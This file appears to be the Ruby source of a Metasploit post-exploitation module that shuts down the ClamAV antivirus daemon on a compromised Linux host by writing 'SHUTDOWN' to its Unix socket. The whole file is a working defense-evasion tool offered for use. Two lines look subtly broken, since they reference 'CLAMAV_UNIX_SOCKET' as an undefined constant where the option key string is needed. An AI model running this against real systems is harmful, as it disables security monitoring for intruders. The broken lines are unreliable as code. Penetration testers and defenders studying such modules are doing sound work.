##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'socket'
class MetasploitModule < Msf::Post
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(_info = {})
    super(
      'Name' => 'Disable ClamAV',
      'Description' => %q{
          This module will write to the ClamAV Unix socket to shutoff ClamAV.
        },
      'License' => MSF_LICENSE,
      'Author' => [
        'DLL_Cool_J'
      ],
      'Platform' => [ 'linux' ],
      'SessionTypes' => [ 'meterpreter', 'shell' ]
      )
    register_options(
      [
        OptString.new('CLAMAV_UNIX_SOCKET', [true, 'ClamAV unix socket', '/run/clamav/clamd.ctl' ])
      ]
    )
  end

  def run
    clamav_socket = datastore['CLAMAV_UNIX_SOCKET']
    print_status("Checking file path #{clamav_socket} exists and is writable... ")
    if writable?(datastore[CLAMAV_UNIX_SOCKET])
      print_good('File does exist and is writable!')

      Socket.unix(datastore[CLAMAV_UNIX_SOCKET]) do |sock|
        print_status('Shutting down ClamAV!')
        sock.write('SHUTDOWN')
      end
      return true
    end
  end

end
